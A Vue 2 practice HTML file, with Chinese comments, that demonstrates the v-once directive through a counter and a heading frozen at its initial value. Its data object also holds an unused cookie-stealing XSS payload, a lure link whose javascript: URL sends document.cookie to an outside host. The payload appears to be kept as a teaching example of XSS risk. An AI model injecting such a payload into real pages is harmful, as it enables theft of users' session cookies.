<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../vue/vue.js"></script>
</head>
<body>
    <!-- 
        本次总结：
               v-once指令(没有值)
                   1.v-once所在节点在初次动态选人后，就视为静态内容了
                   2.以后数据的改变不会引起v-once所在的结构的更新，可以用于优化性能

                    
     -->
    <div class="ming">
          <h2>当前的n值是:{{n}}</h2>
          <h2 v-once>初始化的n值是:{{n}}</h2>
          <button @click="n++">点我加1</button>
    </div>
     <script>
         Vue.config.productionTip = false
         
        const vm = new Vue({
            el:'.ming',
            data:{
              name:'李明',
              str:'<h1>明姐我还是想你</h1>',
              str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟有好东西哟</a>',
              n:1
            },
            
            
          })
     </script>
    
</body>
</html>
